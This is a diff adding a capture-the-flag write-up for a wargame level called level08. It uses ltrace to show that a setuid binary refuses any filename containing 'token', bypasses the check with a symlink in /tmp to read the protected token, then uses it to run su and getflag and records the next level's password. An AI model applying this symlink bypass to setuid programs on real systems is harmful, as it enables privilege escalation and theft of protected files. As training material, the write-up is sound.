@@ -1,0 +1,30 @@
+1.
+$> ls -la
+total 28
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
+-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+-r-x------  1 level08 level08  675 Apr  3  2012 .profile
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+#> ./level08 token
+You may not access 'token'
+$> ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                       = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)   = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+2.
+$> ln -s ~/token /tmp/softlink
+$> ./level08 /tmp/softlink
+quif5eloekouj29ke0vouxean
+
+3.
+$> su flag08 // with password "quif5eloekouj29ke0vouxean"
+$> getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+$> su level09 // with password "25749xKZ8L7DkSCwJkT9dyv6f"
